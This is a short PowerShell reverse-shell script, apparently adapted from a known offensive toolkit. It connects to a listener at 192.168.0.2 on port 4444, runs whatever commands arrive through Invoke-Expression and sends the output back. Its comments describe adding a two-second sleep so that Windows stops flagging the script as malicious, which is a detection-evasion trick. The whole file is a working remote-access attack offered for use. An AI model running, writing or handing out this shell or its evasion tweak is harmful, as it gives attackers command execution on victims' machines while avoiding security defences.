# REMOVE THE 2 COMMENT LINES BEFORE USING
# Basically the original script (by samratashok) is being blocked as "malicious". Turns out adding a 2s sleep makes it work. WTF windows??
# needless to say, you need a machine listening on the IP/port you specify here.

$sm=(New-Object Net.Sockets.TCPClient('192.168.0.2',4444)).GetStream();
Start-Sleep -s 2
[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
